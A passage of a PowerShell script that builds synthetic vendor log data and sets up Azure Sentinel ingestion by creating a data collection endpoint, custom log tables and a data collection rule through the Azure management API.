# ============================================================
# 2.  Utility helpers
# ============================================================

function Get-RandomTs {
    $off = Get-Random -Minimum 120 -Maximum 300
    return (Get-Date).ToUniversalTime().AddSeconds(-$off)
}

function Get-IsoTs([datetime]$ts) { return $ts.ToString("yyyy-MM-ddTHH:mm:ss.fffZ") }

function Pick([array]$arr) { return $arr[(Get-Random -Min 0 -Max $arr.Count)] }

function RandInt([int]$min, [int]$max) { return Get-Random -Minimum $min -Maximum $max }

function New-Guid8 { return ([guid]::NewGuid().ToString().Split('-')[0]).ToUpper() }

function Get-RandomDevice { return Pick $StableDevices }
function Get-RandomUser   { return Pick $StableUsers }
function Get-RandomExtIP  { return Pick $StableExternalIPs }
function Get-RandomDnsRecord              { return Pick $StableDnsRecords }
function Get-DnsRecordsByCategory([string]$cat) {
    $matches = $StableDnsRecords | Where-Object { $_.Category -eq $cat }
    if ($matches.Count -gt 0) { return Pick @($matches) }
    return Pick $StableDnsRecords
}
function Get-DnsRecordsByVendor([string]$v) {
    $matches = $StableDnsRecords | Where-Object { $_.Vendor -eq $v }
    if ($matches.Count -gt 0) { return Pick @($matches) }
    return Pick $StableDnsRecords
}
function Get-ConsumerDnsRecord {
    $matches = $StableDnsRecords | Where-Object { $_.Consumer -eq $true }
    return Pick @($matches)
}
function Get-CorporateDnsRecord {
    $matches = $StableDnsRecords | Where-Object { $_.Consumer -eq $false }
    return Pick @($matches)
}
function Get-ThreatDnsRecord {
    $matches = $StableDnsRecords | Where-Object { $_.Category -in @("Malware-C2","Phishing","Tor-Exit") }
    return Pick @($matches)
}


# Weighted severity so criticals are rarer
function Get-WeightedSeverity {
    $roll = RandInt 1 100
    if     ($roll -le 5)  { return "Critical" }
    elseif ($roll -le 20) { return "High" }
    elseif ($roll -le 50) { return "Medium" }
    else                  { return "Low" }
}

function Get-SeverityNum([string]$sev) {
    switch ($sev) { "Critical"{10} "High"{8} "Medium"{5} "Low"{3} default{1} }
}

# ============================================================
# 3.  ARM helper (Invoke-ArmApi)
# ============================================================

function Invoke-ArmApi {
    param(
        [string]$Method,
        [string]$Uri,
        [object]$Body = $null
    )
    $headers = @{
        "Authorization" = "Bearer $ArmToken"
        "Content-Type"  = "application/json"
    }
    $params = @{ Method=$Method; Uri=$Uri; Headers=$headers; ErrorAction="Stop" }
    if ($Body) { $params.Body = ($Body | ConvertTo-Json -Depth 20 -Compress) }
    try {
        return Invoke-RestMethod @params
    } catch {
        $msg = $_.ErrorDetails?.Message ?? $_.Exception.Message
        Write-Warning "ARM API error [$Method $Uri]: $msg"
        throw
    }
}

# ============================================================
# 4.  Infrastructure setup
# ============================================================

# Vendor short names — tables will be "Sample<Vendor>_CL", streams "Custom-Sample<Vendor>_CL"
$TableBase  = @("FwVendor2","EndpointVendor1","EndpointVendor2","FwVendor1","Kubernetes")
$TablePrefix = "Sample"

# DCR schema — 4 columns matching the provided template (all vendor detail in RawData)
$DcrColumns = @(
    @{ name="TimeGenerated"; type="datetime" }
    @{ name="RawData";       type="string"   }
    @{ name="SourceVendor";  type="string"   }
    @{ name="FileName";      type="string"   }
)

# --- 4a. Resolve workspace resource ID & customer ID ---
Write-Host "`n[SETUP] Resolving workspace..." -ForegroundColor Cyan
$wsUri  = "https://management.azure.com/subscriptions/$SubscriptionId/resourceGroups/$ResourceGroup/providers/Microsoft.OperationalInsights/workspaces/$($WorkspaceName)?api-version=2023-09-01"
$ws     = Invoke-ArmApi -Method GET -Uri $wsUri
$WsId   = $ws.id
$WsCustomerId = $ws.properties.customerId
Write-Host "[SETUP] Workspace ID      : $WsId"

if (-not $SkipInfraSetup) {

    # --- 4b. Create or update DCE ---
    Write-Host "`n[INFRA] Creating/updating DCE: $DceName..." -ForegroundColor Cyan
    $dceUri  = "https://management.azure.com/subscriptions/$SubscriptionId/resourceGroups/$ResourceGroup/providers/Microsoft.Insights/dataCollectionEndpoints/$($DceName)?api-version=2023-03-11"
    $dceBody = @{
        location   = $Location
        kind       = "Linux"
        properties = @{ networkAcls = @{ publicNetworkAccess = "Enabled" } }
    }
    $dce = Invoke-ArmApi -Method PUT -Uri $dceUri -Body $dceBody
    $DceId            = $dce.id
    $DceIngestionUrl  = $dce.properties.logsIngestion.endpoint
    Write-Host "[INFRA] DCE created: $DceId"
    Write-Host "[INFRA] Ingestion endpoint: $DceIngestionUrl"

    # --- 4c. Create custom _CL tables with the 4-column DCR schema ---
    foreach ($vendor in $TableBase) {
        $tableName = "${TablePrefix}${vendor}_CL"
        Write-Host "[INFRA] Creating table $tableName..." -ForegroundColor Cyan
        $tblUri  = "https://management.azure.com$WsId/tables/$($tableName)?api-version=2023-09-01"
        $tblBody = @{
            properties = @{
                schema = @{
                    name    = $tableName
                    columns = $DcrColumns
                }
                retentionInDays      = 30
                totalRetentionInDays = 30
            }
        }
        try {
            Invoke-ArmApi -Method PUT -Uri $tblUri -Body $tblBody | Out-Null
            Write-Host "[INFRA] Table $tableName created/updated." -ForegroundColor Green
        } catch {
            Write-Warning "Table $tableName may already exist or creation is async — continuing."
        }
    }

    # --- 4d. Create / update DCR — one rule, one stream per vendor, matching provided template ---
    Write-Host "`n[INFRA] Creating/updating DCR: $DcrName..." -ForegroundColor Cyan

    $streamDeclarations = @{}
    $dataFlows          = @()

    foreach ($vendor in $TableBase) {
        $streamName = "Custom-${TablePrefix}${vendor}_CL"
        $streamDeclarations[$streamName] = @{ columns = $DcrColumns }
        $dataFlows += @{
            streams         = @($streamName)
            destinations    = @("sentinel-workspace")
            transformKql    = "source"
            outputStream    = $streamName
        }
    }

    $dcrUri  = "https://management.azure.com/subscriptions/$SubscriptionId/resourceGroups/$ResourceGroup/providers/Microsoft.Insights/dataCollectionRules/$($DcrName)?api-version=2023-03-11"
    $dcrBody = @{
        location   = $Location
        properties = @{
            dataCollectionEndpointId = $dce.id
            streamDeclarations       = $streamDeclarations
            destinations             = @{
                logAnalytics = @(
                    @{ workspaceResourceId = $WsId; name = "sentinel-workspace" }
                )
            }
            dataFlows                = $dataFlows
        }
    }
    $dcr            = Invoke-ArmApi -Method PUT -Uri $dcrUri -Body $dcrBody
    $DcrId          = $dcr.id
    $DcrImmutableId = $dcr.properties.immutableId
    Write-Host "[INFRA] DCR created : $DcrId"
    Write-Host "[INFRA] Immutable ID: $DcrImmutableId"

    # Persist config for subsequent runs
    @{
        DceIngestionUrl = $DceIngestionUrl
        DcrImmutableId  = $DcrImmutableId
    } | ConvertTo-Json | Set-Content -Path "ingestion-config.json"

} else {
    # Load persisted config
    $cfg = Get-Content "ingestion-config.json" | ConvertFrom-Json
    $DceIngestionUrl = $cfg.DceIngestionUrl
    $DcrImmutableId  = $cfg.DcrImmutableId
    Write-Host "[SETUP] Loaded config — DCE: $DceIngestionUrl  DCR: $DcrImmutableId"
}

